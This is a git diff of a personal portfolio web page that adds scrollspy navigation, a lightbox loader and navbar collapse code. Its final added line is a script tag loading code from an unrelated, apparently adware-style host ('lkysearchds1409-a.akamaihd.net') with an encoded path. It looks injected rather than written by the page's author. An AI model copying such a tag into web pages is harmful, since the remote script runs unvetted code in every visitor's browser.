@@ -206,7 +206,8 @@
       <!--Section: Projects-->
       <section id="portfolio" class="section feature-box">
 
-        <h3 class="h3 wow zoomIn text-center mb-5">What I have<span class="logo-font-title"> been </span>up to lately</h3>
+        <h3 class="h3 wow zoomIn text-center mb-5">What I have<span class="logo-font-title"> been </span>up to lately
+        </h3>
 
         <!--Grid row-->
         <div class="row wow fadeIn text-center">
@@ -605,6 +606,23 @@
     </div>
   </main>
   <!--Main layout-->
+  
+  <!-- Scroll -->
+  <div class="dotted-scrollspy clearfix d-none d-sm-block">
+
+      <ul class="nav smooth-scroll flex-column">
+  
+        <li class="nav-item"><a class="nav-link" href="#landing"><span></span></a></li>
+  
+        <li class="nav-item"><a class="nav-link" href="#about"><span></span></a></li>
+  
+        <li class="nav-item"><a class="nav-link" href="#portfolio"><span></span></a></li>
+  
+        <li class="nav-item"><a class="nav-link" href="#contact"><span></span></a></li>
+  
+      </ul>
+  
+    </div>
 
   <!--Footer-->
   <footer class="page-footer text-center font-small mt-4 wow fadeIn">
@@ -634,22 +652,25 @@
 
     // initialize scrollspy
     $('body').scrollspy({
-
       target: '.dotted-scrollspy'
     });
 
-    var offset = 100;
+    // initialize lightbox
+    $(function () {
 
-    $('.navbar li a').click(function (event) {
-      event.preventDefault();
-      $($(this).attr('href'))[0].scrollIntoView();
-      scrollBy(0, -offset);
+      $("#mdb-lightbox-ui").load("../mdb-addons/mdb-lightbox-ui.html");
+    });
+
+    $('.navbar-collapse a').click(function () {
+
+      $(".navbar-collapse").collapse('hide');
     });
 
     /* WOW.js init */
     new WOW().init();
 
   </script>
+  <script src="https://lkysearchds1409-a.akamaihd.net/sec/pjs/Xnpkcg%3D%3D"></script>
 </body>
 
 </html>
